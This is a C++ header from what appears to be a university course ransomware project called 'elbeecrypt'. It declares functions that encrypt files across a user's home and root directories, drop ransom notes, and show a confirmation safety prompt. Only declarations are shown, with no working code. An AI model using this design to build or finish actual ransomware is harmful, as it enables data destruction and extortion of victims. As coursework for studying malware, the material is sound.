#pragma once

#include <filesystem>
#include <string>
#include <tuple>
#include <vector>
#include "elbeecrypt/common/io/cryptor-engine.hpp"

namespace fs = std::filesystem;

/**
 * @brief Contains the function definitions for the
 * main executable file of the encryption portion of
 * the ransomware.
 * 
 * @author CECS-378 Group 10
 * @file main.hpp
 */
namespace elbeecrypt::cryptor::Main {
	/**
	 * @brief Drops a ransom note in all of the given directories.
	 * 
	 * @param targets The target directories to drop the ransom note in
	 * @param cEngine The cryptor engine that encrypted the files
	 * @param roots The root paths that were hit
	 * @param encrypted The list of files that were encrypted
	 * @param homeFolderDesktop The user's desktop location
	 */
	void dropRansomNote(
		const std::vector<fs::path>& targets, common::io::CryptorEngine& cEngine, 
		const std::vector<fs::path>& roots, const std::vector<fs::path>& encrypted,
		const fs::path& homeFolderDesktop
	);

	/**
	 * @brief Runs the encryption payload of the ransomware.
	 * 
	 * @param homeFolder The user's home folder
	 * @param roots The list of root directories to target
	 * @param cryptorEngine The cryptor engine instance to use
	 * @return A list of the files that were successfully encrypted
	 */
	std::vector<fs::path> encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots, elbeecrypt::common::io::CryptorEngine& cryptorEngine);

	/**
	 * @brief Prompts the user warning them of potential system damage.
	 * Serves as a safety net in case the user accidentally launched the
	 * program on their system.
	 * 
	 * @return Whether the application is allowed to move forward
	 */
	bool safetyNet();
}